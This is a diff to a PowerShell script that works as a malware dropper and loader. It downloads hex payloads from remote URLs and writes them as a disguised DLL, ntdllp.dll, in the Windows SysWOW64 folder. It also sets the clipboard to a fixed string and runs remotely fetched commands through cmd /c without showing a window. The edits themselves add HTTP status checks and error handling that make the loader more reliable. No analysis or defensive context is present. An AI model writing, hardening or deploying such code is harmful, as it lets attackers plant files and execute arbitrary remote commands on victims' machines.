@@ -6,6 +6,7 @@ $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
     param([string]$hexStr)
+    $hexStr = $hexStr.Trim()
     $byteArr = [byte[]]::new($hexStr.Length / 2)
     for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
         $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
@@ -14,12 +15,17 @@ function HexToBytes {
 }
 try {
     $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
-    $hexContent = $responseA.Content.Trim()
-    if ($hexContent -match '^[0-9A-Fa-f]+$' -and $hexContent.Length % 2 -eq 0) {
-        $bytes = HexToBytes $hexContent
-        [IO.File]::WriteAllBytes($filePath, $bytes)
+    if ($responseA.StatusCode -eq 200) {
+        $hexContent = $responseA.Content.Trim()
+        if ($hexContent -and $hexContent -match '^[0-9A-Fa-f]+$' -and $hexContent.Length % 2 -eq 0) {
+            $bytes = HexToBytes $hexContent
+            [IO.File]::WriteAllBytes($filePath, $bytes)
+        } else {
+            Write-Error "Invalid hex content received from $urlA"
+            exit 1
+        }
     } else {
-        Write-Error "Invalid hex content received from $urlA"
+        Write-Error "Received non-200 status code from $urlA"
         exit 1
     }
 } catch {
@@ -29,9 +35,14 @@ try {
 Set-Clipboard $clipText
 try {
     $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
-    $cmdToRun = $responseB.Content.Trim()
-    if ($cmdToRun) {
-        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
+    if ($responseB.StatusCode -eq 200) {
+        $cmdToRun = $responseB.Content.Trim()
+        if ($cmdToRun) {
+            Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
+        }
+    } else {
+        Write-Error "Received non-200 status code from $urlB"
+        exit 1
     }
 } catch {
     Write-Error "Failed to download or execute command from $urlB`: $_"
@@ -42,21 +53,29 @@ do {
 } while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
 try {
     $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
-    $newHexContent = $responseC.Content.Trim()
-    if ($newHexContent -match '^[0-9A-Fa-f]+$' -and $newHexContent.Length % 2 -eq 0) {
-        $newBytes = HexToBytes $newHexContent
-        [IO.File]::WriteAllBytes($filePath, $newBytes)
+    if ($responseC.StatusCode -eq 200) {
+        $newHexContent = $responseC.Content.Trim()
+        if ($newHexContent -and $newHexContent -match '^[0-9A-Fa-f]+$' -and $newHexContent.Length % 2 -eq 0) {
+            $newBytes = HexToBytes $newHexContent
+            [IO.File]::WriteAllBytes($filePath, $newBytes)
+        } else {
+            Write-Error "Invalid hex content received from $urlC"
+        }
     } else {
-        Write-Error "Invalid hex content received from $urlC"
+        Write-Error "Received non-200 status code from $urlC"
     }
 } catch {
     Write-Error "Failed to download or process file from $urlC`: $_"
 }
 try {
     $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
-    $finalCmdContent = $responseD.Content.Trim()
-    if ($finalCmdContent) {
-        Start-Process cmd -ArgumentList "/c $finalCmdContent" -NoNewWindow
+    if ($responseD.StatusCode -eq 200) {
+        $finalCmdContent = $responseD.Content.Trim()
+        if ($finalCmdContent) {
+            Start-Process cmd -ArgumentList "/c $finalCmdContent" -NoNewWindow
+        }
+    } else {
+        Write-Error "Received non-200 status code from $urlD"
     }
 } catch {
     Write-Error "Failed to download or execute command from $urlD`: $_"
